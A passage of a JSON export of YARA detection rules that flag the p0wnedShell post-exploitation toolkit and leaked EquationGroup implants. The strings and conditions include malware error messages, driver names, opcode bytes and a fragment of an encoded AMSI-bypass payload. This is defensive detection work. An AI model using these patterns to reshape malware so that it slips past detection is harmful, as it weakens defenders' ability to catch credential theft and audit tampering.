= \"namespace p0wnedShell\" fullword ascii\n   condition: \n      1 of them\n}","date":"2017-01-14 09:53:51","description":"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedBinaries.cs","minimum_yara":"1.7","name":"p0wnedBinaries_RID2C8C","reference":"https://github.com/Cn33liz/p0wnedShell","required_modules":[],"rule_hash":"8ffcf4bdd6d1e6c8957f6c8c65fc44ac","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule p0wnedAmsiBypass_RID2D5B : DEMO HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedAmsiBypass_RID2D5B.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 10:28:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Program.P0wnedPath()\" fullword ascii\n      $x2 = \"namespace p0wnedShell\" fullword ascii\n      $x3 = \"H4sIAAAAAAAEAO1YfXRUx3WflXalFazQgiVb5nMVryzxIbGrt/rcFRZIa1CQYEFCQnxotUhP2pX3Q337HpYotCKrPdbmoQQnkOY0+BQCNKRpe\" ascii\n   condition: \n      1 of them\n}","date":"2017-01-14 10:28:21","description":"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedAmsiBypass.cs","minimum_yara":"1.7","name":"p0wnedAmsiBypass_RID2D5B","reference":"https://github.com/Cn33liz/p0wnedShell","required_modules":[],"rule_hash":"a92e749a34bf888473ae0590d34cd46c","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule p0wnedShell_outputs_RID2EDA : DEMO HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - from files p0wnedShell.cs, p0wnedShell.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 11:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] For this attack to succeed, you need to have Admin privileges.\" fullword ascii\n      $s2 = \"[+] This is not a valid hostname, please try again\" fullword ascii\n      $s3 = \"[+] First return the name of our current domain.\" fullword ascii\n   condition: \n      1 of them\n}","date":"2017-01-14 11:32:11","description":"p0wnedShell Runspace Post Exploitation Toolkit - from files p0wnedShell.cs, p0wnedShell.cs","minimum_yara":"1.7","name":"p0wnedShell_outputs_RID2EDA","reference":"https://github.com/Cn33liz/p0wnedShell","required_modules":[],"rule_hash":"fae77efe2e7e7f3c63fcba229f86e3ca","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_LSADUMP_Lp_RID2FF4 : APT DEMO EXE FILE HKTL MAL {\n   meta:\n      description = \"EquationGroup Malware - file LSADUMP_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 12:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"LSADUMP - - ERROR - - Injected\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}","date":"2017-01-13 12:19:11","description":"EquationGroup Malware - file LSADUMP_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_LSADUMP_Lp_RID2FF4","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"731309734d583d0b837598bf2d05851b","score":75,"tags":["MAL","DEMO","FILE","APT","EXE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_ntevt_RID342B : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file ntevt.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 15:19:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ntevt.sys\" fullword ascii\n      $s2 = \"c:\\\\ntevt.pdb\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}","date":"2017-01-13 15:19:01","description":"EquationGroup Malware - file ntevt.sys","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_ntevt_RID342B","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"c483c99bb2995e71c8dd0f5c6e86678e","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_nethide_Implant_RID32D8 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file nethide_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\dlcndi\" fullword ascii\n      $s2 = \"s\\\\drivers\\\\\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and all of them )\n}","date":"2017-01-13 14:22:31","description":"EquationGroup Malware - file nethide_Implant.dll","minimum_yara":"1.7","name":"EquationGroup_nethide_Implant_RID32D8","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"fd10578a09eaf704b1c8c0fa85176a18","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_msgkd_RID3410 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file msgkd.ex_\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 15:14:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"KEysud\" fullword ascii\n      $s2 = \"XWWWPWS\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 15:14:31","description":"EquationGroup Malware - file msgkd.ex_","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_msgkd_RID3410","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"046e15346ad7a723a7e4d679a2d8772a","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_GetAdmin_Lp_RID30E7 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file GetAdmin_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 12:59:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Current user is System -- unable to join administrators group\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 12:59:41","description":"EquationGroup Malware - file GetAdmin_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_GetAdmin_Lp_RID30E7","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"1e97b4e713cbfb29ec26d361b16108d3","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_pwdump_Lp_RID307B : APT DEMO EXE FILE MAL T1003 {\n   meta:\n      description = \"EquationGroup Malware - file pwdump_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 12:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"PWDUMP - - ERROR - -\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 12:41:41","description":"EquationGroup Malware - file pwdump_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_pwdump_Lp_RID307B","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"4d69ca11f0e60bf0b1f454979f965219","score":75,"tags":["MAL","DEMO","T1003","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_ProcessOptions_Lp_RID33A9 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file ProcessOptions_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Invalid parameter received by implant\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 14:57:21","description":"EquationGroup Malware - file ProcessOptions_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_ProcessOptions_Lp_RID33A9","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"95c49a9808264ae52b5ebaeb7bde14b3","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_modifyAudit_Implant_RID3476 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file modifyAudit_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 15:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LSASS.EXE\" fullword wide\n      $s2 = \"hNtQueryInformationProcess\" fullword ascii\n      $s3 = \"hZwOpenProcess\" fullword ascii\n      $s4 = \".?AVFeFinallyFailure@@\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and ( all of ( $s* ) ) ) or ( all of them )\n}","date":"2017-01-13 15:31:31","description":"EquationGroup Malware - file modifyAudit_Implant.dll","minimum_yara":"1.7","name":"EquationGroup_modifyAudit_Implant_RID3476","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"4711346bf0a7a3901db5e88c6afe8a7e","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_modifyAudit_Lp_RID325D : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file modifyAudit_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Read of audit related process memory failed\" fullword wide\n      $s2 = \"** This may indicate that another copy of modify_audit is already running **\" fullword wide\n      $s3 = \"Pattern match of code failed\" fullword wide\n      $s4 = \"Base for necessary auditing dll not found\" fullword wide\n      $s5 = \"Security auditing has been disabled\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them ) or ( all of them )\n}","date":"2017-01-13 14:02:01","description":"EquationGroup Malware - file modifyAudit_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_modifyAudit_Lp_RID325D","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"7ce3a67ebf3c885e3f168ad6c257db86","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_ProcessHide_Lp_RID3237 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file ProcessHide_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 13:55:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invalid flag.  Can only hide or unhide\" fullword wide\n      $x2 = \"Process elevation failed\" fullword wide\n      $x3 = \"Unknown error hiding process\" fullword wide\n      $x4 = \"Invalid process links found in EPROCESS\" fullword wide\n      $x5 = \"Unable to find SYSTEM process\" fullword wide\n      $x6 = \"Process hidden, but EPROCESS location lost\" fullword wide\n      $x7 = \"Invalid EPROCESS location for given ID\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( 3 of them )\n}","date":"2017-01-13 13:55:41","description":"EquationGroup Malware - file ProcessHide_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_ProcessHide_Lp_RID3237","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"e4eeea73bc431a2aa77fb8a339b29ab8","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_pwdump_Implant_RID3294 : APT DEMO EXE FILE MAL T1003 {\n   meta:\n      description = \"EquationGroup Malware - file pwdump_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $s8 = \".?AVFeFinallySuccess@@\" fullword ascii\n      $s3 = \"\\\\system32\\\\win32k.sys\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-01-13 14:11:11","description":"EquationGroup Malware - file pwdump_Implant.dll","minimum_yara":"1.7","name":"EquationGroup_pwdump_Implant_RID3294","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"f6cee9fed16d5765f68c5a14593d54a0","score":75,"tags":["MAL","DEMO","T1003","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_Gen_5_RID33A8 : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level3_http_dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:57:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Psxssdll.dll\" fullword wide\n      $s2 = \"Posix Server Dll\" fullword wide\n      $s3 = \"itanium\" fullword wide\n      $s6 = \"Copyright (C) Microsoft\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 14:57:11","description":"EquationGroup Malware - file PC_Level3_http_dll","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_Gen_5_RID33A8","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"791a85ac7fbdd11ef97f59c6945f2c9f","score":75,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_PC_Level3_http_flav_dll_RID35A2 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level3_http_flav_dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 16:21:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Psxssdll.dll\" fullword wide\n      $s2 = \"Posix Server Dll\" fullword wide\n      $s4 = \"itanium\" fullword wide\n      $s5 = \"RHTTP/1.0\" fullword wide\n      $s8 = \"Copyright (C) Microsoft\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 16:21:31","description":"EquationGroup Malware - file PC_Level3_http_flav_dll","minimum_yara":"1.7","name":"EquationGroup_PC_Level3_http_flav_dll_RID35A2","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"9187c03351bb7c6040273a8d4d7bf05f","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_mstcp32_RID3486 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file mstcp32.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 15:34:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mstcp32.sys\" fullword wide\n      $s2 = \"p32.sys\" fullword ascii\n      $s3 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s4 = \"\\\\DosDevices\\\\%ws\" fullword wide\n      $s5 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n      $s6 = \"sys\\\\mstcp32.dbg\" fullword ascii\n      $s7 = \"%ws%03d%ws%wZ\" fullword wide\n      $s8 = \"TCP/IP driver\" fullword wide\n      $s9 = \"\\\\Device\\\\%ws\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 7 of them ) or ( all of them )\n}","date":"2017-01-13 15:34:11","description":"EquationGroup Malware - file mstcp32.sys","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_mstcp32_RID3486","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"711ad989f61f61e6f8751c657833d285","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_nethide_Lp_RID30BF : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file nethide_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 12:53:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error: Attempt to hide all TCP connections (any:any).\" fullword wide\n      $x2 = \"privilegeRunInKernelMode failed\" fullword wide\n      $x3 = \"Failed to unhide requested connection\" fullword wide\n      $x4 = \"Nethide running in USER_MODE\" fullword wide\n      $x5 = \"Not enough slots for all of the list.  Some entries may have not been hidden.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( all of them )\n}","date":"2017-01-13 12:53:01","description":"EquationGroup Malware - file nethide_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_nethide_Lp_RID30BF","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"fc2123bcb001f25954b833a873e53ca6","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_PC_Level4_flav_dll_x64_RID34C5 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level4_flav_dll_x64\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 15:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wship.dll\" fullword wide\n      $s2 = \"   IP:      \" fullword ascii\n      $s3 = \"\\\\\\\\.\\\\%hs\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-01-13 15:44:41","description":"EquationGroup Malware - file PC_Level4_flav_dll_x64","minimum_yara":"1.7","name":"EquationGroup_PC_Level4_flav_dll_x64_RID34C5","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"1114404f89cce39b3a23177e8d9643c2","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_PC_Level4_flav_exe_RID338A : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level4_flav_exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:52:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Extended Memory Runtime Process\" fullword wide\n      $s2 = \"memess.exe\" fullword wide\n      $s3 = \"\\\\\\\\.\\\\%hs\" fullword ascii\n      $s4 = \".?AVOpenSocket@@\" fullword ascii\n      $s5 = \"Corporation. All rights reserved.\" fullword wide\n      $s6 = \"itanium\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-01-13 14:52:11","description":"EquationGroup Malware - file PC_Level4_flav_exe","minimum_yara":"1.7","name":"EquationGroup_PC_Level4_flav_exe_RID338A","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"ddc8abb3594dfb720f95e7170000e9f3","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_processinfo_Implant_RID34A2 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file processinfo_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 15:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"hZwOpenProcessToken\" fullword ascii\n      $s2 = \"hNtQueryInformationProcess\" fullword ascii\n      $s3 = \"No mapping\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}","date":"2017-01-13 15:38:51","description":"EquationGroup Malware - file processinfo_Implant.dll","minimum_yara":"1.7","name":"EquationGroup_processinfo_Implant_RID34A2","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"8623d4c50ddab329bd52f60061c657f2","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_Gen_2_RID33A5 : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"EquationGroup Malware - file PortMap_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:56:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b } \n      $op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 } \n      $op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them )\n}","date":"2017-01-13 14:56:41","description":"EquationGroup Malware - file PortMap_Implant.dll","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_Gen_2_RID33A5","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"7d82cdec429d163b812c955033e0c6b9","score":75,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_Gen_4_RID33A7 : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level4_flav_dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:57:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 11 8b da 23 df 8d 1c 9e c1 fb 02 33 da 23 df 33 } \n      $op2 = { c3 0c 57 8b 3b eb 27 8b f7 83 7e 08 00 8b 3f 74 } \n      $op3 = { 00 0f b7 5e 14 8d 5c 33 18 8b c3 2b 45 08 50 ff } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 14:57:01","description":"EquationGroup Malware - file PC_Level4_flav_dll","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_Gen_4_RID33A7","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"c26d566d8386245260cee2c2f1d7ffc2","score":75,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_tdi6_RID3371 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file tdi6.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:48:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"tdi6.sys\" fullword wide\n      $s3 = \"TDI IPv6 Wrapper\" fullword wide\n      $s5 = \"Corporation. All rights reserved.\" fullword wide\n      $s6 = \"FailAction\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-01-13 14:48:01","description":"EquationGroup Malware - file tdi6.sys","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_tdi6_RID3371","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"68be2c7ef9b027d0a96d405f14054ee1","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_modifyAuthentication_Implant_RID383F : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file modifyAuthentication_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 18:13:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LSASS.EXE\" fullword wide\n      $s2 = \"hsamsrv.dll\" fullword ascii\n      $s3 = \"hZwOpenProcess\" fullword ascii\n      $s4 = \"hOpenProcess\" fullword ascii\n      $s5 = \".?AVFeFinallyFailure@@\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-01-13 18:13:01","description":"EquationGroup Malware - file modifyAuthentication_Implant.dll","minimum_yara":"1.7","name":"EquationGroup_modifyAuthentication_Implant_RID383F","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"e7ca66adb01f6427291200a74e10160a","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_ntfltmgr_RID3031 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file ntfltmgr.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 12:29:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ntfltmgr.sys\" fullword 